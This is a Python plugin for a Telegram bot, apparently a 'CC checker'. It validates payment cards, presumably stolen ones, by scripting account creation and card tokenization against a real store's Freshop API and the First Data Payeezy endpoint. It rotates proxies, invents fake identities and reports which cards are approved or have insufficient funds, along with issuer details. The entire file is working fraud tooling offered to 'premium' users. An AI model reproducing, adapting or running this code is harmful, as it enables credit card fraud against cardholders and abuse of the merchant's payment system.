import requests as r 
from src.extras.check import makeGate
from datetime import datetime
from src.assets.functions import antispam
from src.assets.connection import Database
from pyrogram.types import Message
from pyrogram import Client, filters, enums
from pyrogram.enums import ParseMode
import string, random, time, rsa, base64, names, json

BIN_API = "https://bins.antipublic.cc/bins/"
name_gate = "Payeezy_Auth"
subtype = "Payeezy Auth"
command = "yz"

@Client.on_message(filters.command([f"{name_gate}", f"{command}"], ["/", ",", ".", ";", "-"], case_sensitive=False))
async def gateway(client: Client, m: Message):
    card = m.text.split(" ", 1)[1] if not m.reply_to_message else m.reply_to_message.text
    user_id = m.from_user.id
    with Database() as db:
        if not db.IsPremium(user_id):
            return await m.reply("<b>You are not premium</b>", quote=True)
        user_info = db.GetInfoUser(m.from_user.id)
    if not card:
        return await m.reply("You need to provide a card to verify", quote=True)
    antispam_result = antispam(user_id, user_info["ANTISPAM"])
    if antispam_result != False:
        return await m.reply(
            f"Please wait <code>{antispam_result}'s</code>", quote=True
        )
    await client.send_chat_action(m.chat.id, action=enums.ChatAction.TYPING)
    msgg = f"""<b>Checking... 🌩️</b>
━━━━━━━━━━━
<b>CC:</b> {card}
<b>Status:</b> Loading..."""
    msg = await m.reply(msgg, quote=True)
    cc_check = await get_live(card, msg) 


async def get_live(card, msg):

    initial_time = time.perf_counter()
    BIN = card[0:6]
    data_bin = r.get(BIN_API+BIN).json()

    

    card_splited = makeGate.split_card(card) 
    ccnum = card_splited[0]
    mes = card_splited[1]
    ano = card_splited[2]
    if len(ano) == 4:
        ano = ano[2:4]
    cvv = card_splited[3] 


    current_time = datetime.now().strftime("%D - %H:%M:%S")
    fecha_hora_actual = datetime.now()
    current_timestamp = int(fecha_hora_actual.timestamp() * 1000)
    email = f"{names.get_first_name()}{names.get_last_name()}%40gmail.com"
    four = random.randint(1000, 9999)
    tree = random.randint(100, 999)

    proxies = makeGate.load_proxies("src/extras/proxies.txt")
    proxy = random.choice(proxies)
    session = r.Session()

            

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ First Requests: get initial page ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    headers = {
        'authority': 'api.freshop.com',
        'referer': 'https://www.shakersmarketplace.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    }

    data = {
        'app_key': 'shakers',
        'locale': 'false',
        'referrer': 'https://www.shakersmarketplace.com/',
        'utc': current_timestamp,
        }


    response = session.post('https://api.freshop.com/2/sessions/create', headers=headers, data=data).text
        
    token = makeGate.getStr(response, '"token":"', '"')

    msgg = f"""<b>{current_time} 🌩️</b>
━━━━━━━━━━━
<b>CC:</b> {card}
<b>Status:</b> Loading...
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin['brand']}</code> - <code>{data_bin['type']}</code> - <code>{data_bin['level']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin['bank']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin['country_name']} {data_bin['country_flag']}</code>"""
    await msg.edit_text(msgg, parse_mode=ParseMode.HTML, disable_web_page_preview=True)

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Second request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        
    headers = {
        'authority': 'api.freshop.com',
        'origin': 'https://www.shakersmarketplace.com',
        'referer': 'https://www.shakersmarketplace.com/my-account',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    }

    data = f'address_1=Street+16th+av+billonarie&app_key=shakers&city=New+York&email={email}&first_name=Juan&last_name=Smith&password=Kurama%231212&phone=(248)+{tree}-{four}&phone_country=us&postal_code=10080&referrer=https%3A%2F%2Fwww.shakersmarketplace.com%2Fmy-account%23!%2Fcreate&selected_store_id=3667&state=ny&token={token}&utc={current_timestamp}'



    response = session.post('https://api.freshop.com/2/users/create', headers=headers, data=data).text
            
            
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Third request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        
    headers = {
        'authority': 'api.freshop.com',
        'origin': 'https://www.shakersmarketplace.com',
        'referer': 'https://www.shakersmarketplace.com/my-account',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    }

    params = {
        'app_key': 'shakers',
        'is_default_for_delivery': 'true',
        'token': token,
        }

        

    response = session.get('https://api.freshop.com/2/user_addresses', params=params, headers=headers).text
    userid = makeGate.getStr(response, '"user_id":"', '"')            
            
            
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Fourth request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        
    headers = {
        'authority': 'api.freshop.com',
        'origin': 'https://www.shakersmarketplace.com',
        'referer': 'https://www.shakersmarketplace.com/my-account',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    }

    data = f'app_key=shakers&referrer=https%3A%2F%2Fwww.shakersmarketplace.com%2Fmy-account%23!%2Fpayment-methods%3Fid%3D0%26identifier%3Dpayeezy_v2&store_id=3667&token={token}&utc={current_timestamp}'

    response = session.post(
                f'https://api.freshop.com/2/users/{userid}/saved_payment/payeezy_v2/initiate',
                headers=headers,
                data=data,
    )
                
    jsondata = response.json()
    resp = response.text
    bearer = makeGate.getStr(resp, '"client_token":"', '"')
                

    public_key_bytes = base64.b64decode(jsondata["publicKeyBase64"])


    public_key = rsa.PublicKey.load_pkcs1_openssl_pem(public_key_bytes)

    data_to_encrypt = {
            'name': 'Juan Smith',
            'card': ccnum,
            'cvv': cvv,
            'exp': f'{mes}/{ano}'
    }
            
    json_string = json.dumps(data_to_encrypt)

    encrypted_data = rsa.encrypt(json_string.encode('utf-8'), public_key)

    encrypted_data_base64 = base64.b64encode(encrypted_data).decode('utf-8')
                
            
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Fifth request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Access-Control-Request-Headers': 'client-token,content-type',
        'Access-Control-Request-Method': 'POST',
        'Connection': 'keep-alive',
        'Origin': 'https://docs.paymentjs.firstdata.com',
        'Referer': 'https://docs.paymentjs.firstdata.com/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        }
            

    response = session.options('https://prod.api.firstdata.com/paymentjs/v2/client/tokenize', headers=headers)
        
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Sixth request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        
    headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Client-Token': f'Bearer {bearer}',
            'Origin': 'https://docs.paymentjs.firstdata.com',
            'Referer': 'https://docs.paymentjs.firstdata.com/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    }

    json_data = {
            'encryptedData': encrypted_data_base64,
        }



    response = session.post('https://prod.api.firstdata.com/paymentjs/v2/client/tokenize', headers=headers, json=json_data).text
                
        
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Seventh request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        
    headers = {
            'authority': 'api.freshop.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.shakersmarketplace.com',
            'referer': 'https://www.shakersmarketplace.com/my-account',
            'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        }

    data = f'app_key=shakers&browser_color_depth=24&browser_java_enabled=False&browser_java_script_enabled=True&browser_language=en-US&browser_screen_height=768&browser_screen_width=1366&browser_time_zone=300&card_token={bearer}&referrer=https%3A%2F%2Fwww.shakersmarketplace.com%2Fmy-account%23!%2Fpayment-methods%3Fid%3D0%26identifier%3Dpayeezy_v2&save_payment=true&store_id=3667&token={token}&utc={current_timestamp}'



    response = session.post(
        f'https://api.freshop.com/2/users/{userid}/payment_methods/payeezy_v2',
        headers=headers,
        data=data,
                )
        
    time.sleep(2)
                
        
    if "{}" in response.text:
        msgx = "Approved Auth!✅"
        respuesta = "Subscription completed"
            
    elif int(response.text.find('Insufficient Funds')) > 0 :
        msgx = "APPROVED CVV✅"
        respuesta = "Insufficient Funds"
                            
    else:
        respuesta = makeGate.getStr(response.text, '"error_message":"', '"')
        msgx = "DECLINED! ❌"

    final_time = time.perf_counter() - initial_time
    data = r.get(BIN_API+BIN).json()

    card_response = f"""<b>#Payeezy_Auth ($yz) 🌩️</b>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">↯</a> <b>CC:<b> [<code>{ccnum}:{mes}:{ano}:{cvv}</code>]
<a href="https://t.me/ByDog3r">↯</a> <b>Status: {msgx}<b> 
<a href="https://t.me/ByDog3r">↯</a> <b>Response:</b> {respuesta}
<a href="https://t.me/ByDog3r">↯</a> <b>Gateway: {subtype}</b>
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data['brand']}</code> - <code>{data['type']}</code> - <code>{data['level']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data['bank']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data['country_name']} {data['country_flag']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <b>Time</b> : {final_time:0.2}"""
    await msg.edit_text(card_response, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
